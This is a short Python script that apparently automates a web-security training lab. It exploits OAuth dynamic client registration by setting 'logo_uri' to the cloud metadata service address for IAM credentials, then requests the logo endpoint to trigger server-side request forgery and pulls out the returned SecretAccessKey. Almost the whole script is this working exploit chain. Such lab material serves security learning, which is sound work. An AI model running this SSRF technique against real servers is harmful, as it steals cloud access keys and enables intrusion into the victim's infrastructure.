import sys
import requests
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
first_part = burp_url + '/social-login'
solution = burp_url + '/submitSolution'


session = requests.Session()

response = session.get(first_part)
second_part = re.search(r"content='3;url=(.*?)'>",response.text).group(1)
index_second_equal = second_part.find('=', second_part.find('=') + 1)
poczatek = second_part[:index_second_equal + 1]

oauth_host_header = second_part.split('/')[2]
oauth_url = 'https://' + second_part.split('/')[2]

burp_headers = {"Content-Type": "application/json"}
burp_json={"logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/", "redirect_uris": ["https://example.com"]}
r = session.post(oauth_url+'/reg', json=burp_json)
client_id = re.search(r'"client_id":"([a-zA-Z0-9-_]{21})"',r.text).group(1)

final_url = oauth_url + '/client/' + client_id + '/logo'

response = session.get(final_url)
answer = re.search(r'"SecretAccessKey" : "([a-zA-Z0-9]{40})"',response.text).group(1)

burp_data = {"answer": answer}
session.post(solution,  data=burp_data)
